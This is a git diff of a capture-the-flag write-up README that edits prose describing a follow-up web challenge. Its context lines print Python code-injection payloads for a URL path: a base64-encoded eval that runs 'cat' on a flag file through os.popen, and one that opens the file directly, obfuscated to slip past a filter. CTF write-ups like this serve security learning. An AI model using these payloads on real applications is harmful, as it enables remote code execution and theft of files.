@@ -14,9 +14,9 @@ May the Packet be with you!
 This challenge is a follow-up to [Streamlining portal](../01-streamlining-portal/README.md).
 
 Obviously, the payload from the original challenge doesn't work here. It returns `404 NOT FOUND` so there is
-some kind of new filter.
+some kind of new protection.
 
-The first idea was to obfuscate the payload (`__import__('os').popen('cat /app/FLAG/flag.txt').read()`):
+The first idea was to obfuscate my original payload (`__import__('os').popen('cat /app/FLAG/flag.txt').read()`):
 
 ```
 /hello/"+eval(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9hcHAvRkxBRy9mbGFnLnR4dCcpLnJlYWQoKQ=='.encode('ascii')))#
@@ -24,9 +24,10 @@ The first idea was to obfuscate the payload (`__import__('os').popen('cat /app/F
 > Hello
 ```
 
-It returns empty string. No error, just empty string. It works well for the original challenge.
+It returns empty string. No error, just empty string. This obfuscated payload works perfectly fine for the original
+challenge
 
-After some tries and errors I changed the payload to `open("/app/FLAG/flag.txt", "r").read()`:
+After some tries and errors, I changed the payload to `open("/app/FLAG/flag.txt", "r").read()`:
 
 ```
 /hello/"+eval(__import__('base64').b64decode('b3BlbigiL2FwcC9GTEFHL2ZsYWcudHh0IiwgInIiKS5yZWFkKCk='.encode('ascii')))#
